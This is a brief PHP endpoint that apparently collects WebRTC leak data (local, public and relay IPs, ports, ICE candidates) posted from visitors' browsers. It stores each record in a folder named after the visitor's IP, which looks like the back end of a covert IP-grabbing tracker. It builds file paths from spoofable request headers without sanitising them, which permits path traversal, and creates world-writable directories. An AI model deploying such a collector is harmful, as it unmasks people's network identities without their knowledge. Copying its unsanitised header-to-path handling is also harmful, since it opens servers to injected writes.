<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $input = json_decode(file_get_contents("php://input"), true);

    function getUserIP() {
        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            return $_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } else {
            return $_SERVER['REMOTE_ADDR'];
        }
    }

    $ip = getUserIP();
    if ($ip === '127.0.0.1') $ip = 'Localhost';

    $baseDir = __DIR__ . "/../Data";
    $userDir = $baseDir . "/" . $ip . "/Info";
    if (!is_dir($userDir)) mkdir($userDir, 0777, true);

    $filePath = $userDir . "/WebRTC.txt";

    $data = "Local IP: " . ($input['localIP'] ?? 'Local IP not found') . "\n"
          . "Public IP: " . ($input['publicIP'] ?? 'Public IP not found') . "\n"
          . "Relay IP: " . ($input['relayIP'] ?? 'Relay IP not defined') . "\n"
          . "Transport: " . ($input['transport'] ?? 'Transport not defined') . "\n"
          . "Port: " . ($input['port'] ?? 'Port not defined') . "\n"
          . "Candidate Type: " . ($input['candidateType'] ?? 'Candidate type not defined') . "\n"
          . "Full Candidate: " . ($input['fullCandidate'] ?? 'N/A') . "\n"
          . "Time: " . date("Y-m-d H:i:s") . "\n---\n";

    file_put_contents($filePath, $data, FILE_APPEND | LOCK_EX);
    echo "Logged";
}
?>

